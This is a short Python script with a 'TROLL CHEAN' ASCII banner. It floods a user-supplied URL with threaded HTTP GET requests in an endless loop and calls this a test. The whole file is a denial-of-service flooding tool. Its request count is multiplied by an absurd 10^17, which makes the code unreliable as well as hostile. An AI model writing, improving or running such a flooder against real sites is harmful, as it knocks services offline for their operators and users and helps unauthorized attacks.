import requests
import threading
import time
from colorama import init, Fore, Style
init()
def print_ascii_art():
    art = f"""
{Fore.RED}
    ████████╗██████╗  ██████╗ ██╗     ██╗          ██████╗██╗  ██╗███████╗ █████╗ ███╗   ██╗
    ╚══██╔══╝██╔══██╗██╔═══██╗██║     ██║         ██╔════╝██║  ██║██╔════╝██╔══██╗████╗  ██║
       ██║   ██████╔╝██║   ██║██║     ██║         ██║     ███████║█████╗  ███████║██╔██╗ ██║
       ██║   ██╔══██╗██║   ██║██║     ██║         ██║     ██╔══██║██╔══╝  ██╔══██║██║╚██╗██║
       ██║   ██║  ██║╚██████╔╝███████╗███████╗    ╚██████╗██║  ██║███████╗██║  ██║██║ ╚████║
       ╚═╝   ╚═╝  ╚═╝ ╚═════╝ ╚══════╝╚══════╝     ╚═════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝╚═╝  ╚═══╝
{Style.RESET_ALL}
    """
    print(art)
def send_request(url):
    try:
        response = requests.get(url)
        print(f"Request to {url} responded with status code: {response.status_code}")
    except requests.exceptions.RequestException as e:
        print(f"Request to {url} failed: {e}")
def send_multiple_requests(url, num_requests):
    threads = []
    for _ in range(num_requests * 100000000000000000):  
        thread = threading.Thread(target=send_request, args=(url,))
        threads.append(thread)
        thread.start()
    for thread in threads:
        thread.join()
if __name__ == "__main__":
    print_ascii_art()
    url = input("Enter the URL to test: ")
    num_requests = int(input("Enter the number of requests to send simultaneously: "))
    print("Press Ctrl+C to stop the program.\n")
    try:
        while True:
            send_multiple_requests(url, num_requests)
            time.sleep(1)  
    except KeyboardInterrupt:
        print("\nProgram stopped by user.")
